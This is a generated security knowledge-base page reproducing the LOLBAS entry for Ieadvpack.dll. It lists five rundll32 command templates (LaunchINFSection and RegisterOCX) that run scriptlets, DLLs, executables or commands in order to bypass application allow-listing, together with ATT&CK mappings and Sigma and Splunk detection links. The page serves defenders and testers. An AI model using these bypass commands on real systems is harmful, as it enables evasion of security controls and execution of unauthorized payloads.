---
title: "Ieadvpack.dll"
framework: "lolbas"
generated: "true"
source_path: "yml/OSLibraries/Ieadvpack.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml"
build_date: "2026-04-27 19:14:21"
category: "OSLibraries"
aliases:
  - "Ieadvpack.dll"
functions:
  - "AWL Bypass"
  - "Execute"
attack_technique_ids:
  - "T1218.011"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.

## Paths

- `c:\windows\system32\ieadvpack.dll`
- `c:\windows\syswow64\ieadvpack.dll`

## Commands

### 1. AWL Bypass

Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).

```cmd
rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},DefaultInstall_SingleUser,1,
```

- Use Case: Run local or remote script(let) code through INF file specification.
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218011-rundll32|T1218.011: Rundll32]]

### 2. AWL Bypass

Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied).

```cmd
rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},,1,
```

- Use Case: Run local or remote script(let) code through INF file specification.
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218011-rundll32|T1218.011: Rundll32]]

### 3. Execute

Launch a DLL payload by calling the RegisterOCX function.

```cmd
rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.dll}
```

- Use Case: Load a DLL payload.
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218011-rundll32|T1218.011: Rundll32]]

### 4. Execute

Launch an executable by calling the RegisterOCX function.

```cmd
rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.exe}
```

- Use Case: Run an executable payload.
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218011-rundll32|T1218.011: Rundll32]]

### 5. Execute

Launch command line by calling the RegisterOCX function.

```cmd
rundll32 ieadvpack.dll, RegisterOCX {CMD}
```

- Use Case: Run an executable payload.
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218011-rundll32|T1218.011: Rundll32]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
- Splunk: https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/detect_rundll32_application_control_bypass___advpack.yml

## Resources

- {'Link': 'https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/'}
- {'Link': 'https://twitter.com/pabraeken/status/991695411902599168'}
- {'Link': 'https://twitter.com/0rbz_/status/974472392012689408'}

## Acknowledgements

- {'Person': 'Jimmy (LaunchINFSection)', 'Handle': '@bohops'}
- {'Person': 'Fabrizio (RegisterOCX - DLL)', 'Handle': '@0rbz_'}
- {'Person': 'Pierre-Alexandre Braeken (RegisterOCX - CMD)', 'Handle': '@pabraeken'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml)
